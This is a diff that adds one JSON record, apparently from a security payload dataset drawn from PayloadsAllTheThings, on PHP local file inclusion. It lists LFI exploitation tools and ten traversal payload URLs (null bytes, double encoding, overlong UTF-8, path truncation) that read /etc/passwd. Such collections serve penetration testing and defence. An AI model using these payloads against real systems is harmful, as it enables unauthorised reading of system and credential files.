@@ -1,0 +1,27 @@
+{
+  "id": "rce-3024bcfab6b6",
+  "category": "RCE",
+  "title": "README",
+  "description": "# File Inclusion\n\n> A File Inclusion Vulnerability refers to a type of security vulnerability in web applications, particularly prevalent in applications developed in PHP, where an attacker can include a file, usually exploiting a lack of proper input/output sanitization. This vulnerability can lead to a range of malicious activities, including code execution, data theft, and website defacement.\n\n## Summary\n\n- [Tools](#tools)\n- [Local File Inclusion](#local-file-inclusion)\n    - [Null Byte](#nul",
+  "payloads": [
+    "- [P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus) (archived on Oct 7, 2020) - kadimus is a tool to check and exploit lfi vulnerability.",
+    "- [D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite) - Totally Automatic LFI Exploiter (+ Reverse Shell) and Scanner",
+    "- [kurobeats/fimap](https://github.com/kurobeats/fimap) - fimap is a little python tool which can find, prepare, audit, exploit and even google automatically for local and remote file inclusion bugs in webapps.",
+    "- [lightos/Panoptic](https://github.com/lightos/Panoptic) - Panoptic is an open source penetration testing tool that automates the process of search and retrieval of content for common log and config files through path traversal vulnerabilities.",
+    "- [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - Local File Inclusion discovery and exploitation tool",
+    "http://example.com/index.php?page=../../../etc/passwd",
+    "http://example.com/index.php?page=../../../etc/passwd%00",
+    "http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd",
+    "http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00",
+    "http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+    "http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00",
+    "http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]",
+    "http://example.com/index.php?page=../../../etc/passwd\\.\\.\\.\\.\\.\\.[ADD MORE]",
+    "http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE]",
+    "http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd"
+  ],
+  "references": [
+    "PayloadsAllTheThings/File Inclusion/README.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
